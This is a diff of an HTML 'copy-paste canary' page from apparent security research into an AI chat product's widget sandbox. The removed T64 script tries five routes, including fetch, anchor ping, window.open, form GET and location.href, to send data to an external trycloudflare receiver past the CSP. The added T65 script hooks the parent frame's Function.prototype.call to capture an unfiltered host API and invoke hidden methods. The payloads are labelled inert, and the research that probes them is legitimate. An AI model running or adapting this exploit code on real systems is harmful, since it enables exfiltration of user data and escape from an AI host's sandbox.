@@ -18,86 +18,93 @@ footer { padding:12px 16px; color:#789; font-size:12px; border-top:1px solid #33
 </head>
 <body>
 <header>
-  <h1>T64-NAV-EXFIL - inert copy-paste canary (Pluto Security research)</h1>
+  <h1>T65-JE-STATE-INSTRUMENT - inert copy-paste canary (Pluto Security research)</h1>
   <button onclick="copyCode()">Copy code</button>
   <span class="note">then paste into the playground Output box and press Run</span>
 </header>
-<div id="wrap"><pre id="code">/* T64 NAVIGATION EXFIL - Pluto Security research, inert canary.
-   Rationale: the widget CSP has NO form-action directive (and
-   form-action does NOT fall back to default-src), the sandbox
-   tokens include allow-forms when external navigation is on, and
-   the runner&#x27;s form-routing / navigate-canceller hooks are only
-   installed for OTHER widget classes (enableExternalNavigationGating
-   / disableExternalNavigation are not passed for inline
-   visualizations). T4 (Oct 18) judged forms &quot;blocked&quot; by watching
-   for a NEW TAB - but a form with no target navigates the iframe
-   itself, and there was no network ground truth then.
-   Question: can the VIEWER-session widget send a canary to the
-   researcher&#x27;s own receiver with ZERO clicks via a navigation
-   channel (anchor ping / window.open / form GET / location.href)?
-   fetch is included as the known-blocked control (T43).
-   Data sent = inert &quot;T64-*&quot; labels only. Nothing else stored. */
+<div id="wrap"><pre id="code">/* T65 - THE ONE UNKNOCKED DOOR: Je.updateWidgetState + Je.sendInstrument.
+   Handoff item 2. T56 captured the unfiltered host API (Je, 13 keys)
+   via a cross-realm Function.prototype.call hook but called NOTHING on
+   it (T57 tested only callMcp). This probe re-captures Je the same
+   proven way, restores the hook, then fires exactly TWO inert calls:
+   - Je.updateWidgetState({t65:&quot;canary-state&quot;, at:&lt;epoch&gt;})  (hidden;
+     T54 says statePersistence=&quot;none&quot; for our class -&gt; expect
+     rejection or no-op)
+   - Je.sendInstrument(&quot;t65-canary&quot;, {t65:1, at:&lt;epoch&gt;})     (telemetry;
+     expect accept-and-ignore - unreadable by the attacker either way)
+   Nothing else is called. Nothing is persisted intentionally. If
+   updateWidgetState RESOLVES, do not reload yet - report first (a
+   reload-persistence variant, T65b, follows only in that case). */
 (function () {
-  var R = &quot;https://between-notified-postposted-classic.trycloudflare.com/leak?d=&quot;;
-  function log(m) { try { console.log(&quot;[T64] &quot; + m + &quot; @&quot; + Date.now()); } catch (e) {} }
-  log(&quot;START nav-exfil (inert) origin=&quot; + location.origin);
+  var d = document;
+  var box = d.createElement(&quot;div&quot;);
+  box.id = &quot;t65-box&quot;;
+  box.style.cssText = &quot;position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;max-height:50vh;overflow:auto;white-space:pre-wrap;word-break:break-all&quot;;
+  box.textContent = &quot;T65: hooking runner .call to capture Je...&quot;;
+  d.body.appendChild(box);
 
-  var t = 0;
-  function step(f) { setTimeout(f, t); t += 900; }
-
-  /* S1 control: plain fetch - expect CSP-blocked (T43/T61) */
-  step(function () {
-    log(&quot;S1 fetch-control firing&quot;);
-    fetch(R + &quot;T64-S1-fetch-control-&quot; + Date.now(), { cache: &quot;no-store&quot; })
-      .then(function (r) { log(&quot;S1 fetch-OK?! status=&quot; + r.status + &quot; (connect-src changed - report this)&quot;); })
-      .catch(function (e) { log(&quot;S1 fetch-blocked &quot; + (e &amp;&amp; e.message)); });
-  });
-
-  /* S2 anchor ping: ping is governed by ping-src -&gt; default-src &#x27;self&#x27;.
-     Expect blocked by CSP; receiver log decides. href &quot;#&quot; keeps the doc alive. */
-  step(function () {
+  function show(m) {
+    box.textContent = m;
+    try { console.log(m); } catch (e) {}
+  }
+  function dump(r) {
     try {
-      var a = document.createElement(&quot;a&quot;);
-      a.href = &quot;#&quot;;
-      a.ping = R + &quot;T64-S2-ping-&quot; + Date.now();
-      document.body.appendChild(a);
-      a.click();
-      log(&quot;S2 ping-click fired (href #)&quot;);
-    } catch (e) { log(&quot;S2 ERR &quot; + e.message); }
-  });
+      if (r &amp;&amp; typeof r === &quot;object&quot;) {
+        var s = String(r);
+        var props = [];
+        for (var k in r) { try { props.push(k + &quot;=&quot; + String(r[k]).slice(0, 120)); } catch (e4) {} }
+        return s + (props.length ? &quot; {&quot; + props.join(&quot;, &quot;).slice(0, 400) + &quot;}&quot; : &quot;&quot;);
+      }
+      return String(r);
+    } catch (e) { return &quot;unprintable&quot;; }
+  }
 
-  /* S3 raw window.open popup - expect the Chrome popup blocker (no gesture).
-     If it opens: zero-click data delivery (visible tab). */
-  step(function () {
+  var P = null;
+  try { P = window.parent; } catch (e) {}
+  if (!P || P === window) { show(&quot;T65: no accessible parent realm&quot;); return; }
+  var origCall;
+  try { origCall = P.Function.prototype.call; } catch (e) { show(&quot;T65: cannot read parent .call: &quot; + e); return; }
+  var captured = null;
+  try {
+    P.Function.prototype.call = function (t) {
+      try {
+        if (!captured &amp;&amp; t &amp;&amp; typeof t === &quot;object&quot; &amp;&amp;
+            typeof t.callTool === &quot;function&quot; &amp;&amp;
+            typeof t.updateWidgetState === &quot;function&quot;) captured = t;
+      } catch (e2) {}
+      return origCall.apply(this, arguments);
+    };
+  } catch (e) { show(&quot;T65: hook write failed: &quot; + e); return; }
+
+  var api = window.oai || window.openai || window.webplus;
+  try { if (api &amp;&amp; api.notifyIntrinsicWidth) api.notifyIntrinsicWidth(window.innerWidth || 300); } catch (e) {}
+  try { if (api &amp;&amp; api.setWidgetState) api.setWidgetState({ t65: &quot;trigger&quot; }); } catch (e) {}
+  try { if (api &amp;&amp; api.callTool) api.callTool(&quot;t65-trigger&quot;); } catch (e) {}
+
+  setTimeout(function () {
+    try { P.Function.prototype.call = origCall; } catch (e) {}
+    if (!captured) { show(&quot;T65: Je NOT captured (no matching .call dispatch). Hook removed.&quot;); return; }
+
+    var lines = [&quot;T65 Je captured (&quot; + Object.keys(captured).length + &quot; keys). Firing 2 inert calls...&quot;];
+
     try {
-      var w = window.open(R + &quot;T64-S3-windowopen-&quot; + Date.now(), &quot;_blank&quot;);
-      log(&quot;S3 window.open -&gt; &quot; + (w ? &quot;OPENED (zero-click tab)&quot; : &quot;null (blocked)&quot;));
-    } catch (e) { log(&quot;S3 ERR &quot; + e.message); }
-  });
+      var r1 = captured.updateWidgetState({ t65: &quot;canary-state&quot;, at: Date.now() });
+      if (r1 &amp;&amp; typeof r1.then === &quot;function&quot;) {
+        r1.then(function (v) { lines.push(&quot;updateWidgetState RESOLVED: &quot; + dump(v)); },
+                function (v) { lines.push(&quot;updateWidgetState REJECTED: &quot; + dump(v)); });
+      } else { lines.push(&quot;updateWidgetState returned (non-promise): &quot; + dump(r1)); }
+    } catch (e) { lines.push(&quot;updateWidgetState THREW: &quot; + (e &amp;&amp; e.message)); }
 
-  /* S4 form GET, _self navigation - the headline channel.
-     May navigate this frame away (app dies after this) or pop a host
-     dialog (openExternalForm). Logged BEFORE firing either way. */
-  step(function () {
-    log(&quot;S4 form-GET firing (frame may navigate away now)&quot;);
     try {
-      var f = document.createElement(&quot;form&quot;);
-      f.method = &quot;GET&quot;;
-      f.action = R + &quot;T64-S4-form-get-&quot; + Date.now();
-      document.body.appendChild(f);
-      f.submit();
-      log(&quot;S4 submit() returned (no exception)&quot;);
-    } catch (e) { log(&quot;S4 ERR &quot; + e.message); }
-  });
+      var r2 = captured.sendInstrument(&quot;t65-canary&quot;, { t65: 1, at: Date.now() });
+      if (r2 &amp;&amp; typeof r2.then === &quot;function&quot;) {
+        r2.then(function (v) { lines.push(&quot;sendInstrument RESOLVED: &quot; + dump(v)); },
+                function (v) { lines.push(&quot;sendInstrument REJECTED: &quot; + dump(v)); });
+      } else { lines.push(&quot;sendInstrument returned (non-promise): &quot; + dump(r2)); }
+    } catch (e) { lines.push(&quot;sendInstrument THREW: &quot; + (e &amp;&amp; e.message)); }
 
-  /* S5 self-navigation via location.href - pure navigation, no form.
-     Only reached if S4 did not navigate the frame. */
-  step(function () {
-    log(&quot;S5 self-nav firing (frame will navigate away if unblocked)&quot;);
-    location.href = R + &quot;T64-S5-selfnav-&quot; + Date.now();
-  });
-
-  step(function () { log(&quot;DONE all steps attempted&quot;); });
+    setTimeout(function () { show(lines.join(&quot;\n&quot;)); }, 1200);
+  }, 1500);
 })();
 </pre></div>
 <footer>inert research canary - inbound fetch control only, no exfiltration</footer>
